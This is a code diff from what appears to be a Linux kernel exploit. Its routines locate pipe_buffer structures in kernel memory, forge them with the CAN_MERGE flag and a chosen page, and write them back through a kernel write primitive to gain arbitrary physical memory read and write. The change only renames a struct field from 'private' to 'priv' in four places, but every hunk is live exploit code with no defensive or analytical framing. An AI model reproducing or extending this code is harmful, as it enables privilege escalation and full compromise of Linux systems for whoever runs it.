@@ -525,7 +525,7 @@ int find_pipe_buffer(int fd, uintptr_t base) {
       pipe_scan_len++;
     }
     if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
-        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
+        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.priv != 0) {
       continue;
     }
     if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
@@ -537,7 +537,7 @@ int find_pipe_buffer(int fd, uintptr_t base) {
     pipe_probe_found = 1;
     pipe_probe_page = pb.page;
     pipe_probe_ops = pb.ops;
-    pipe_probe_private = pb.private;
+    pipe_probe_private = pb.priv;
     pipe_probe_len = pb.len;
     pipe_probe_flags = pb.flags;
     return 1;
@@ -581,7 +581,7 @@ int pipe_phys_read(
   pb.len = len + 1;
   pb.ops = pipe_buf_ops_addr();
   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
-  pb.private = 0;
+  pb.priv = 0;
 
   ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
   if (patch != (ssize_t)sizeof(pb)) {
@@ -643,7 +643,7 @@ int pipe_phys_write(
   pb.len = 0;
   pb.ops = pipe_buf_ops_addr();
   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
-  pb.private = 0;
+  pb.priv = 0;
 
   ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
   if (patch != (ssize_t)sizeof(pb)) {
